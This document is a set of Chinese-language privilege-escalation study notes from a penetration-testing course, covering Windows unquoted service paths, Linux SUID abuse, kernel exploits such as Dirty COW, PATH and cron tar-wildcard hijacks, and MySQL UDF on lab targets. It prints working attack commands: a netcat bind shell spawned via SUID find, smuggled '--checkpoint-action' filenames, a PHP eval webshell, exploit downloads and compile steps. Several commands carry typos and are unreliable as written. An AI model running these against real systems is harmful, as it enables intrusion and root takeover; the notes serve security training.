监听,获得会话,直接获得SYstem权限

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawIUAoJJiauSeXwrHrGvuP44e3xRIo9iaMTH7cOeyuqFNOicjtbkZia4xiaVQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



win2012-不带引号服务路径配合MSF-web,本地提权

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawCsLdKoA9tWrSL8TjgIx1Sfo5o7xnQfnTOFWTzoznl18YWgzg4FKBAg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawjWrpckgPoYiaCFCE5J9Ollb2uibQkwrnTQnvtkhp8z5wnJ0Beaiae5omQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



该命令显示这两个地方可以操作。有安全问题的必须时目录里面带空格的

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw4NbAVFtN2EGBleiceOcXzXLoiaPDbUzaTdNgicu1qXkTVhbNbUTyyPrYg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

当这样执行时,系统会把C:\Program空格后面的当作参数

我们可以把一个cmd名字改为Program,这样就能运行了

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawpPezYOvEknD26JUzViaNPrPlHQ4AZVAkk2oo3qkuTV1boljicWepkoTw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



上传名字为Program的木⻢,用本地启用,启动端口监听,获得了会话

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawTKSnRV0a0F2libV6uoTibbTsomaarXG4e71XcGmu5Tk2ad0iczhzLVEWg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



关于Windows相关知识点总结说明-权限层,系统层,防护层等

掌握:提权方法对应层面,提权方法对应系统版本,相关文件及后⻔免杀问题等



------

**day63.Linux 脏牛内核漏洞 &SUID& 信息收集**



\#自动信息收集

主要使用三个用于枚举机器的脚本,它们在脚本之间有些区别,但是它们输出的内容很多相同。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawF1CGhecQZFUEX5WaEhw1rjaWbgkf9SqmZrCzVByDMKZicJGrYTmrczw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



演示案例

Linux提权自动化脚本利用-4个脚本

两个信息收集:LinEnum(通过webshell等权限讲脚本上传到/tmp目录(这个目录是一个临时目录,重启后会清空,一般是可以进行读写的),上传其他目录可能会因为权限不够而失败),

Linuxprivchecker(是一个python文件,前期要收集服务器是否能够运行python文件)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawIib3GRict4pVwXs0icdUKH6L9Aske0LbHWERXn7BYMdab5AbdxNEIAOfQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



重点要使用/tmp# chmod +x LinEnum为它赋权两个漏洞探针:linux-exploit-suggester ,linux-exploit-suggester2(是一个pl脚本)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawrwS16PSibdZQaSaab7UIcTGARp5NOjwscULrv7A8ZOsVMia0I8fZoXibw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawKELYengXhr8Z6E96xkpU60yUtl22SiaHySQvJCduWjEN6ehe3x8fY9w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



信息收集有什么用?

信息收集为后续的提权做准备



漏洞探针有什么用?

可以判定主机可能存在的漏洞



Linux提权SUID配合脚本演示-Aliyun(基于web权限)

漏洞成因:chmod u+s给予了suid u-s删除了suid

执行过chmod u+s后,如果用户调用了这个程序会以root权限运行



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw1jLol9ZpiaAlseBicfniaF1w4vKN0v9AVciaaRaic8pqoFAI9VMD97X4wlw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



使程序在运行中受到了suid root权限的执行过程导致

提权过程:探针是否有SUID(手工或脚本)-特定SUID利用-利用吃瓜-GG

以下命令的作用是判断是否有SUID提权的可能性

find / -user root -prem -4000 -print 2>/dev/null

find / -prem -u=s -type f 2>/dev/null

find / -user root -prem -4000 -exec ls -ldb { } \;



也可以用脚本来判断

检测有没有这个东⻄



- 

```
参考利用:https://pentestlab.blog/2017/09/25/suid-executables/
```

- 
- 
- 
- 
- 

```
touch xiaodi
find xiaodi -exec whoami \;find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;netcat xx.xx.xx.xx 5555
```



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawp2He740RUUQw2OM1efBPt6JvHQBtFUKjeMK15PQSic7pwZIpItqazeA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



使用冰蝎链接webshell

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawXRDBJp4T9N7Z7A7C0Vjv7oEuVfyVxCIPt8icjricq6Xib2ibbAgdhPA6Uw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



打开MSF启动监听,在冰蝎上选择反弹shell,选择Metepreter,在MSF上按照冰蝎显示出来的命令敲,点击给我连

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawSLR8hSbSMx0SpOL0zvKjLv2eYibHIpxIOUCnib3qlklib8uOyB9tVMsLw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



MSF上显示会话已连接,并且权限是www-data

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawiaCbEl0RToUeKBleHAGQe8a9BKsia8CYoW1Au3pkibDwj2DMHGM01UE9Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



可以将信息收集脚本先上传至MSF在上传到目标机,也可以通过冰蝎的文件管理系统

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawQaIicIspJf9c7sriabSnVROFRDMLnLL5fSgBLSz043CiaUKKokbwvtLeA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawhcCeQaYt0aLowpJmAJzVgH7Mia2TTaEicDSAfyA4iafJGuThkY79MV9FQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw9q114Qlf9tFKicgXkNHvrByuFQ8usdmKF6dicjVWuje39qGJkCE8H4xg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

查看以下的信息看是否有SUID提权的可能

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawEah9KbDeD8l7zlCZ1bNEJuPXyRHYvKOZGcgkQibKvV0Kxg03ygAJpBQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



看到有一个find,有SUID提权

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawrWfge3yploicb7aBSBibbKVdmmPIs92RX5AcwibH8icR56zP2AXubdT2OQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawN1PvykDogosK40Au9sNubGKraRnUWxTRTZgwra0JtdaNgydVC24lFQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



Linux提权本地配合内核漏洞演示-Mozhe(本地权限)Ubuntu 16.04漏洞复现

CVE-2017-16995

提权过程:连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG



- 
- 
- 
- 

```
gcc 45010.c -o 45010chmod +x 45010./45010id
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawHTJpM5ooQmI2HXic4z2ctib3anNzicPqnBHq27W1Zsib731jWItUIstR8g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



给目标主机上传检测脚本且执行

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawMujztNuDf2hsJzoBiaPoF9Ly5ASXJvNmiaOaDKRSejNAW1ccHRYUzbxQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawjIqdHOAXe6v3XevZdibL3IG2u72Bfcz1wY79jxibLvurEVK1iauJOwVBA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



选择CVE-2017-16995,在网上下载EXP,上传至目标主机,编译EXP

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawIe3r0iaUh8NHgohDF793p9KnASia1EpAtHZxvrLJgC2E3n9p5f72ujIg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



Linux提权脏牛内核漏洞演示-linux-exploit-suggester

内核提权整个过程:(Linux-exploit-suggest获取信息哦)



vulhub(https://www.vulnhub.com/)靶机:探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权内核漏洞提权过程:寻可用-下exp-上/exp-编译exp-执行(无权限用chmod)

namp 192.168.76.0/24

nmap -p1 -65535 192.168.76.141

search drupl

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawoaD95h7x3XzL52cxLg1WVWgicgnVfZ22pa3tJCcmXE0ggaNR5ibibds9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw2eBOaFBYW4NhRibian4TEeHzicICNddEpia7C7kIsqpHVxLwIlD6hic4ELA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



无密码直接攻击

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawoZJeomxbKb4MbicZscgloMrtK6icKmp3Og9JhkuNkIGNWbCDGN0uCXHw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

攻击机采用了kali

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw51fDGvh77txNDBoZgHTWIBQfrVFCUicEZic6Vp1icwct6aPibFuMRpFNQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



nmap进行扫描：找到144段的

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw8HoiamZuic9UkKVyIXLRVDw55LdnIb9QUBzMgk02t6Wm3RIay2rFcCPw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



访问目标主机的1898端口,发现一个web网站,查到他的CMS

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw0yYicvUYToKgfDI8qsav0yGvFvKE5MuEYagI5iaasSbict71ctTJkFN8A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



然后在MSF中搜索这个CMS  找对应的poc进行测试：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawoBrtIbLBmyQNXnliciba8vN5QgcibCKMKWYafRqJN5ibuENnWPazDpbbMA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawPEMnTj9ibQLgdB8hmHkTXC5y8BoTf5jr2H9OoPmzJAZZCFU0hG0GLfQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawFPu3XFOopVEO7c8wmqxqyqt758TlBuFlyXKB0uvgCrlev6pFZQ8VWw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



扫描出多个漏洞,我们选择了CVE-2016-5195(脏牛漏洞,可以借助webs hell权限提升的漏洞)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw4MpsPialdMQGM4ibr5vjzP60KI2VD5WHqtdq5twQYJpcjbRk90sSVsuA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawsENmb4qBHOcKG7ApfxUicB680W6Dbtq9drkZnGkAgglMManSEkcfaBw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)





------

**day64.Linux 定时任务 & 环境变量 & 数据库**

LInux提权本地环境变量安全-aliyun

  

  配合SUID进行环境变量提权-本地用户环境

  手写调用文件-编译-复制文件-增加环境变量-执行触发

- 
- 
- 
- 

```
gcc demo.c -o shellcp /bin/sh /tmp/psexport PATH=/tmp:PATH./shell
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawJPCucZSXJzdUCEoiaQILdichj082DmZibvpIFaTZfIp8Fo4Ko0EcM1OMA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw0uwrjmJEeHkQYpchictXluUcjJica2kgLrvsFUOHtYpib5UsBWtBJ4bjg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawDe5HGEfib2wibjwIdEylz653voaxfAT8wDbogtOPIGiaFHicRGbrS6KDfQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



将 /bin目录下的sh复制到/tmp下改名为ps 到/tmp目录下,如果输入ps则执行的是ps命令,而如果输入的是./ps则执行的是sh

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawJnTPYTryJkBEgStwianibcrKicnT5rTdOmn4WdiauU665ScoSmOVDtfnIw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

如果现在输入ps,则会直接执行/tmp目录下的ps(实际上是sh)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawdnvxHQUrv52pjHsTyHc0XsLYibQwVxb38DbrlW7Hl33PSIFSIpBFw8g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw6muic1ibG6wV1fQu1g1Rr2y9T6PicTicibicCl0IxrTpg8F1JzHeAx983Iog/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawv7AVdxrQCxpvzQEfIzjdeYaLYhzSowuHHZkASXwwZqap0eSQAibKD0w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

ps有suid权限

两个条件:

赋值了suid权限

需要本地用户(如果是webshll权限export PATH=/tmp:PATH执行不了)



Linux提权本地定时任务安全-Aliyun



\#第一种:路径问题(没有实验成功)

利用计划任务指向的文件的相对路径解析问题

- 
- 
- 
- 
- 

```
cat /etc/crontabecho 'cp /bin/basn /tmp/bash;chmod +s /tmp/bash' >/home/xiaodi/test.shchmod +x /home/xiaodi/test.sh/tmp/bash
```

计划任务的test没有写为绝对路径

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw5EjdDexQIZobBfeGkxvNUhE61eeNgGU90qc2yT2Z0PZ9TRpffAKwLg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



计划任务会默认执行在以下目录中的目标文件

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawwy1FFqlKahUerKAWeddKhAeLicVfmRCtDB7W2EKrAEkiav5JmwyK4vRQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawZ8maut87bsDnn0QWlVJROCC5xicbFyaxYUvPjvF4ibSjricwfAianhtCLw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



攻击者可以在用户目录下创建一个同名文件





\#第二种:命令问题(一般是本地提权)

利用通配符配合命令参数自定义命令实现提权

不安全定时任务备份命令

- 
- 
- 
- 
- 
- 
- 
- 

```
cd /home/undead/script; tar czf /tmp/backup.tar.gz *echo 'cp /bin/basn /tmp/bash;chmod +s /tmp/bash' >/home/undead/script/test.shecho " " > "--checkpoint-action=exec=sh tesh.sh"echo " " >--checkpoint=1

参考:https://www.cnblogs.com/manong--/p/8012324.html
```



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawNdSh3OZdlKLs2xSHIqhaSseBGHc198EicrUELPGkOcHQFSVV7hmVhRg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



将这两个文件放到要打包的目录下

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawe7WIib46GagawZ5tG58xtxtDlmTboIaZmfecd71Lic8FYvVrbIfWS3TQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawCb00Pf4eibEJgx4Y1ZDuwUL3xwCQse9YJXFjJgRsCibNHwQsCdibjTsYQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawl7DdSLMgkfuAge7rTbghdVDXicoBw9OUick9ZMUL7NmJU0ibwpQxlaVbw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



cd /home/undead/script; tar czf /tmp/backup.tar.gz * 命令的*会接受文件名,就变成了

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawRiaaA8wkfZh10Bibl552X2hjkQjTXHBrlwKKwRU2OwC8pwibl2PNAPrxA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

执行了test.sh

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawFLBj7rRVdiaa9icSCP6Jok3oxyHqic3qibpLr5J2nPIoyOhqfp8kYbKIpA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



suid提权,执行bash就有了root权限

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawVzia9zHDSF3qibMhGOV3pKeOl02A9iaibEKQjib7OnSGNpstuT84LMOU2hQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



如果不是tar命令,而是其他命令,则要看其他命令是否支持调用执行





\#第三种:权限问题

利用不安全的权限分配操作导致的定时任务覆盖

chmod 777 775等 所有者 组 其他成员说明

一般为管理员为定时任务分配了不当的权限,例如777,导致普通用户可以对定时任务进行覆盖,从而提权

判断漏洞:ls -al 目录



**Linux提权第三方服务数据库MYSQL_UDF-Vulnhub**

  Vulnhub某靶机-探针IP及端口-利用漏洞获取web权限-信息收集-查看数据库配置文件-利用Mysql提权Linux(Mysql版本区别同Windows)

\#探针IP及端口

nmap 192.168.76.0/24



\#利用phpmailer漏洞进行修改并反弹

python D:/Myproject.40974.py nc -lvp 4444



\#写入后⻔利用菜刀连接方便操作

echo '<?php eval($_POST[x]);?>' >1.php

上传信息收集脚本进行提权信息收集

./LinEnum.sh

翻阅数据库配置文件获取root密码



\#利用Mysql提权 searchsploit

下载mysql udf poc进行编译(建议在本地完成,有可能目标没有gcc)

wget https://www.exolpit-db.com/download/1518

mv 1518 raptor_udf.c

gcc -g -c raptor_udf.c

gcc -g -shard -o raptor_udf.so raptor_udf.o

mv raptor_udf.so 1518.so

下载1518到目标服务器(也可以通过webshell上传)

wget https://xx.xx.xx.xx/1518.so

54进入数据库进行UDF导出

数据库导出 直接放在那个目录没有权限

use mysql;

create table foo(line blob0);

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawDbia9wRQlQNtGuXMY2fB5Q3j2FNZNHgdp3dIzYGzmH8RwhBKGVBVCGg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

目标主机

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawoFZT9hQEPqVTmtjchlLq7jm3LQqRUWa8yudMq0LWiazbibR2swPZvhNg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



扫描发现有一个目录遍历,里面有一个PHPMailerAutoload.php第三方插件

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiaw02dPswySQb3xeLQFGu7DKj7E6usRcloIYbQNcO29nfOiaqDoDnrV8Tg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



网上也有PHPMailerAutoload.php的漏洞,下载EXP

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawNiah7sH5ykBZLd2lSToibHHdiagWAdiaaWmjKkeQYYChaMh9IXUfJ2icEWw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



生成了后⻔文件xiaodi.php,反弹到5555的端口,监听

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawgfG3ENrntTCicTTPmU4JS6Et7xy7iclWcA4icOGRiahV2NzcQobiaQIiaonA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

获得webshell在/tmp目录上传信息收集脚本,获得除了suid的信息,还有mysql

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJ9XxwKZ80GJxLQS6mVBBBiawq3x3Pa7TzqyhSNBkFQU2pyWLVRJSdB5ibQxlicyd9QUe4h6yaIj8yicqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



翻阅数据库配置文件获取root密码



------

***LInux提权提升漏洞查找关注点-扩展总结***

1.提权环境,信息收集(SUID,定时任务,可能漏洞,第三方服务应用等)

2.最新相关漏洞要明确(关注点),二次开发相关脚本学会展望(四个脚本)

3.本地searchsploit脚本及远程exploitdb站点搜索说明

4.其他提权方法如:密码复用(mysql或其他第三方应用密码有可能是root密码),guid,sudo等说明

(运气,同理,鸡肋等)





以上为阶段学习笔记的整理，可能格式方面不是很有条理性，望海涵。

技术交流，勿做违法用途.